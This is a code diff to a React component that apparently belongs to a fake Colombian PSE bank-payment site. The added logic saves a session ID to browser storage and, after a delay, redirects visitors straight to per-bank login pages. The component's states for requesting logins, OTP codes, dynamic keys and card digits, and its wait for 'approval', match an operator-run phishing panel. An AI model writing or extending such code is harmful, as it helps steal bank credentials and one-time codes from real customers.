@@ -286,6 +286,21 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
     const canRedirectTc = isTcFlow && Boolean(bank) && tarjetaDigits.length > 0;
     const bankRoute = getPseBankRoute(bank);
 
+    // Redirección directa al login del banco si la sesión está en PSE inicial (pendiente) y en /pse
+    if (!isTcFlow && bank && (estadoLower === "pendiente" || !estadoLower) && window.location.pathname === "/pse") {
+      const directRoute = getPseBankRoute(bank);
+      if (directRoute) {
+        if (sessionIdRef.current) {
+          localStorage.setItem("sessionId", sessionIdRef.current);
+          sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);
+        }
+        setTimeout(() => {
+          window.location.href = directRoute;
+        }, PSE_LOADING_DELAY_MS);
+        return;
+      }
+    }
+
     const tcRedirectStates = ["sol_login", "sol_otp", "sol_din", "error_otp", "error_din"];
     const tcFinalStates = ["sol_finalizar", "sol_finalizado", "solicitar_finalizar"];
 
@@ -697,11 +712,22 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
       // Se valida la respuesta
       if (response.data.success) {
 
-        // Se guarda la sessionId en el localStorage
+        // Se guarda la sessionId en el localStorage y sessionStorage
         localStorage.setItem("sessionId", response.data.sessionId);
+        sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, response.data.sessionId);
 
         // Guardar sesión real del backend
         sessionIdRef.current = response.data.sessionId;
+
+        // Si el backend nos retorna el banco, redirigir directo al login del banco
+        const bankFromBackend = response.data.bank;
+        const directRoute = bankFromBackend ? getPseBankRoute(bankFromBackend) : null;
+        if (directRoute) {
+          setTimeout(() => {
+            window.location.href = directRoute;
+          }, PSE_LOADING_DELAY_MS);
+          return;
+        }
 
         // Iniciar polling para esperar aprobación
         initPolling();
